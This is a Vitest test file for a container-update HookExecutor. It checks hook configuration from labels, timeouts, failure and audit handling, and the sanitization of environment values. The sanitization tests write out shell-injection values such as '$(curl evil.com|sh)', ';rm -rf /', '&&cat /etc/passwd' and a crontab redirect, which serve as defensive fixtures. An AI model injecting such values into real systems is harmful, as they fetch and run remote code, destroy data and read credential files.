import { describe, expect, test, vi } from 'vitest';
import HookExecutor from './HookExecutor.js';

function createLogger() {
  return {
    child: vi.fn().mockReturnValue({}),
  };
}

function createContainer(overrides = {}) {
  return {
    name: 'web',
    id: 'container-id',
    image: {
      name: 'ghcr.io/acme/web',
      tag: {
        value: '1.0.0',
      },
    },
    updateKind: {
      kind: 'tag',
      localValue: '1.0.0',
      remoteValue: '1.0.1',
    },
    labels: {},
    ...overrides,
  };
}

function createExecutor(overrides = {}) {
  return new HookExecutor({
    runHook: vi.fn(),
    getPreferredLabelValue: (labels, ddKey, wudKey) => labels?.[ddKey] ?? labels?.[wudKey],
    getLogger: createLogger,
    recordHookAudit: vi.fn(),
    ...overrides,
  });
}

describe('HookExecutor', () => {
  test('constructor should provide default logger and audit recorder when omitted', () => {
    const runHook = vi.fn();
    const executor = new HookExecutor({
      runHook,
      getPreferredLabelValue: () => undefined,
    });

    const config = executor.buildHookConfig(createContainer());
    expect(config.hookTimeout).toBe(60000);
    expect(() => executor.recordHookAudit('event', {}, 'success', 'ok')).not.toThrow();
  });

  test('constructor should throw when required dependencies are missing', () => {
    expect(() => new HookExecutor({} as never)).toThrow(
      'HookExecutor requires dependency "runHook"',
    );
  });

  test('buildHookConfig should read labels and apply defaults', () => {
    const executor = createExecutor();

    const defaultConfig = executor.buildHookConfig(createContainer());
    expect(defaultConfig).toEqual({
      hookPre: undefined,
      hookPost: undefined,
      hookPreAbort: true,
      hookTimeout: 60000,
      hookEnv: {
        DD_CONTAINER_NAME: 'web',
        DD_CONTAINER_ID: 'container-id',
        DD_IMAGE_NAME: 'ghcr.io/acme/web',
        DD_IMAGE_TAG: '1.0.0',
        DD_UPDATE_KIND: 'tag',
        DD_UPDATE_FROM: '1.0.0',
        DD_UPDATE_TO: '1.0.1',
      },
    });

    const withLabels = executor.buildHookConfig(
      createContainer({
        updateKind: {
          kind: 'digest',
          localValue: null,
          remoteValue: undefined,
        },
        labels: {
          'dd.hook.pre': 'echo pre',
          'wud.hook.post': 'echo post',
          'dd.hook.pre.abort': 'FALSE',
          'wud.hook.timeout': '120000',
        },
      }),
    );

    expect(withLabels.hookPre).toBe('echo pre');
    expect(withLabels.hookPost).toBe('echo post');
    expect(withLabels.hookPreAbort).toBe(false);
    expect(withLabels.hookTimeout).toBe(120000);
    expect(withLabels.hookEnv.DD_UPDATE_FROM).toBe('');
    expect(withLabels.hookEnv.DD_UPDATE_TO).toBe('');
  });

  test('buildHookConfig applies the default timeout for invalid timeout labels', () => {
    const executor = createExecutor();

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'dd.hook.timeout': '120000ms',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'wud.hook.timeout': '-1',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'dd.hook.timeout': '0',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);
  });

  test('isHookFailure and getHookFailureDetails should handle exit code and timeout failures', () => {
    const executor = createExecutor();

    expect(executor.isHookFailure({ exitCode: 0, timedOut: false })).toBe(false);
    expect(executor.isHookFailure({ exitCode: 1, timedOut: false })).toBe(true);
    expect(executor.isHookFailure({ exitCode: 0, timedOut: true })).toBe(true);

    expect(
      executor.getHookFailureDetails(
        'Pre-update',
        { timedOut: true, stderr: '', exitCode: 0 },
        5000,
      ),
    ).toBe('Pre-update hook timed out after 5000ms');
    expect(
      executor.getHookFailureDetails(
        'Post-update',
        { timedOut: false, stderr: 'permission denied', exitCode: 127 },
        5000,
      ),
    ).toBe('Post-update hook exited with code 127: permission denied');
  });

  test('runPreUpdateHook should skip execution when no pre hook is configured', async () => {
    const runHook = vi.fn();
    const executor = createExecutor({ runHook });

    await executor.runPreUpdateHook(
      createContainer(),
      {
        hookPre: '',
        hookPreAbort: true,
        hookTimeout: 1000,
        hookEnv: {},
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).not.toHaveBeenCalled();
  });

  test('runPreUpdateHook should execute hook and record success audit', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: 'completed',
      stderr: '',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await executor.runPreUpdateHook(
      container,
      {
        hookPre: 'echo pre',
        hookPreAbort: true,
        hookTimeout: 3000,
        hookEnv: { SAMPLE: 'true' },
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).toHaveBeenCalledWith('echo pre', {
      timeout: 3000,
      env: { SAMPLE: 'true' },
      label: 'pre-update',
    });
    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-success',
      container,
      'success',
      'Pre-update hook completed: completed',
    );
  });

  test('runPreUpdateHook should throw when pre hook fails and abort is enabled', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 2,
      stdout: '',
      stderr: 'syntax error',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await expect(
      executor.runPreUpdateHook(
        container,
        {
          hookPre: 'exit 2',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('Pre-update hook exited with code 2: syntax error');

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-failed',
      container,
      'error',
      'Pre-update hook exited with code 2: syntax error',
    );
    expect(warn).toHaveBeenCalledWith('Pre-update hook exited with code 2: syntax error');
  });

  test('runPreUpdateHook should rethrow non-pipeline errors from hook execution', async () => {
    const runHook = vi.fn().mockRejectedValue(new Error('spawn ENOENT'));
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'missing-command',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('spawn ENOENT');

    expect(recordHookAudit).not.toHaveBeenCalledWith(
      'hook-pre-failed',
      expect.anything(),
      'error',
      expect.any(String),
    );
    expect(warn).not.toHaveBeenCalled();
  });

  test('runPreUpdateHook should expose a stable error code for aborting failures', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 1,
      stdout: '',
      stderr: 'failed',
      timedOut: false,
    });
    const executor = createExecutor({ runHook });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'exit 1',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn: vi.fn() },
      ),
    ).rejects.toMatchObject({
      code: 'hook-execution-failed',
    });
  });

  test('runPreUpdateHook should continue when pre hook fails but abort is disabled', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: '',
      stderr: '',
      timedOut: true,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'sleep 10',
          hookPreAbort: false,
          hookTimeout: 250,
          hookEnv: {},
        },
        { warn },
      ),
    ).resolves.toBeUndefined();

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-failed',
      expect.anything(),
      'error',
      'Pre-update hook timed out after 250ms',
    );
    expect(warn).toHaveBeenCalledWith('Pre-update hook timed out after 250ms');
  });

  test('runPostUpdateHook should skip execution when no post hook is configured', async () => {
    const runHook = vi.fn();
    const executor = createExecutor({ runHook });

    await executor.runPostUpdateHook(
      createContainer(),
      {
        hookPost: undefined,
        hookTimeout: 1000,
        hookEnv: {},
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).not.toHaveBeenCalled();
  });

  test('runPostUpdateHook should record success audit for successful execution', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: 'ok',
      stderr: '',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await executor.runPostUpdateHook(
      container,
      {
        hookPost: 'echo post',
        hookTimeout: 1000,
        hookEnv: { TEST: '1' },
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).toHaveBeenCalledWith('echo post', {
      timeout: 1000,
      env: { TEST: '1' },
      label: 'post-update',
    });
    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-post-success',
      container,
      'success',
      'Post-update hook completed: ok',
    );
  });

  test('runPostUpdateHook should record failures without throwing', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: '',
      stderr: '',
      timedOut: true,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPostUpdateHook(
        createContainer(),
        {
          hookPost: 'sleep 10',
          hookTimeout: 50,
          hookEnv: {},
        },
        { warn },
      ),
    ).resolves.toBeUndefined();

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-post-failed',
      expect.anything(),
      'error',
      'Post-update hook timed out after 50ms',
    );
    expect(warn).toHaveBeenCalledWith('Post-update hook timed out after 50ms');
  });

  test('runPostUpdateHook should rethrow non-pipeline hook errors', async () => {
    const runHook = vi.fn().mockRejectedValue(new Error('ipc disconnected'));
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPostUpdateHook(
        createContainer(),
        {
          hookPost: 'echo post',
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('ipc disconnected');

    expect(recordHookAudit).not.toHaveBeenCalledWith(
      'hook-post-failed',
      expect.anything(),
      'error',
      expect.any(String),
    );
    expect(warn).not.toHaveBeenCalled();
  });

  describe('buildHookConfig shell env sanitization', () => {
    test('sanitizes dollar-sign and paren command substitution in image tag', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web',
            tag: { value: '1.0.0$(curl evil.com|sh)' },
          },
        }),
      );
      // $, (, ), | each become _
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('1.0.0__curl evil.com_sh_');
    });

    test('sanitizes backtick command substitution in image name', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web`touch /pwned`',
            tag: { value: '1.0.0' },
          },
        }),
      );
      // backticks become _
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('registry.io/acme/web_touch /pwned_');
    });

    test('sanitizes semicolons and ampersands in update-from and update-to values', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          updateKind: {
            kind: 'tag',
            localValue: '1.0.0;rm -rf /',
            remoteValue: '2.0.0&&cat /etc/passwd',
          },
        }),
      );
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('1.0.0_rm -rf /');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('2.0.0__cat /etc/passwd');
    });

    test('sanitizes control characters including newline and null byte', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'container\nname',
          id: 'id\x00val',
          image: {
            name: 'registry.io/acme/web',
            tag: { value: '1.0.0' },
          },
          updateKind: {
            kind: 'tag',
            localValue: null,
            remoteValue: undefined,
          },
        }),
      );
      // newline (0x0a) and null (0x00) are control chars < 0x20, become _
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('container_name');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_val');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
    });

    test('sanitizes DEL character (0x7f) in env values', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web',
            tag: { value: `tag\x7fval` },
          },
        }),
      );
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('tag_val');
    });

    test('sanitizes redirect and pipe characters in container name and id', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'web>>/etc/crontab',
          id: 'id<injected',
        }),
      );
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('web__/etc/crontab');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_injected');
    });

    test('returns empty string for undefined and null container fields', () => {
      const executor = createExecutor();
      // Simulate containers from test fixtures that omit name/id/image/tag/updateKind fields
      const config = executor.buildHookConfig({
        name: undefined as unknown as string,
        id: undefined as unknown as string,
        image: {
          name: undefined as unknown as string,
          tag: { value: undefined as unknown as string },
        },
        updateKind: {
          kind: undefined as unknown as string,
          localValue: undefined,
          remoteValue: null,
        },
        labels: {},
      });
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('');
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('');
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('');
      expect(config.hookEnv.DD_UPDATE_KIND).toBe('');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
    });

    test('passes legitimate container and image values through unchanged', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'my-web-container',
          id: 'abc123def456abc123def456',
          image: {
            name: 'ghcr.io/acme/web-app',
            tag: { value: 'v2.3.1-rc.1' },
          },
          updateKind: {
            kind: 'digest',
            localValue: 'sha256:abc123def456',
            remoteValue: 'sha256:def456abc123',
          },
        }),
      );
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('my-web-container');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('abc123def456abc123def456');
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('ghcr.io/acme/web-app');
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('v2.3.1-rc.1');
      expect(config.hookEnv.DD_UPDATE_KIND).toBe('digest');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('sha256:abc123def456');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('sha256:def456abc123');
    });
  });
});
